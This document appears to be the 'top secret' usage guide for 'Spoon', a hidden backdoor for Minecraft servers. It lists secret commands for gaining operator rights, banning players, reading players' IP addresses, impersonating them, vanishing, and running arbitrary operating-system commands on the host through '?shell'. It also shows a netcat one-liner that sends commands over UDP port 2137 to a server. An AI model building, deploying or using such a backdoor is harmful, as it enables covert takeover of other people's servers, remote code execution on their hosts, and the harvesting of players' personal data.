## Spoon guide (top secret)
```
?coords      <player>                   - get the coordinates of specified player
?op          <player>                   - op specified player
?deop        <player>                   - deop specified player
?ban         <player> <source> [reason] - ban player with reason and source
?banip       <player> <source> [reason] - ip ban player with reason and source
?exec        <command>                  - execute command as server console [Visible]
?shell       <command>                  - execute operating system command as host
?seed                                   - get the current world seed
?psay, ?sudo <player> <message>         - sends messages as player
?reload                                 - Reloads the server [Very visible]
?getip       <player>                   - gets ip of the player
?vanish      <player> <players>         - hides player from players
?unvanish    <player> <players>         - unhiddes player from players
?tp          <player> <X> <Y> <Z>       - teleport to specified coordinates
?exp         <player> [+-]<0-255>[l]    - give a player xp (bug: subtracting xp doesnt subtract levels)
?unban       <player>                   - unbans player
?kick        <player> <reason>          - kicks player for a reason
?god         <player>                   - gives player godmode (YOU CAN STILL GET KILLED IF YOU GET ONESHOT)
?deathcoords <player>                   - gets death coords of player
?bedcoords   <player>                   - gets bed coords of player
?list                                   - list online players
?playerinfo                             - list detailed player information
```

To execute any of the following commands, send the command over UDP/2137 to the server.
For example, you can run the `op` command from your terminal like this:
```bash
$ echo -n "op _install_gentoo" | nc -u exampleserver.com 2137
Opped _install_gentoo ^C
$
```
*Note: You will have to press Ctrl+c after you get a response, for some reason.*
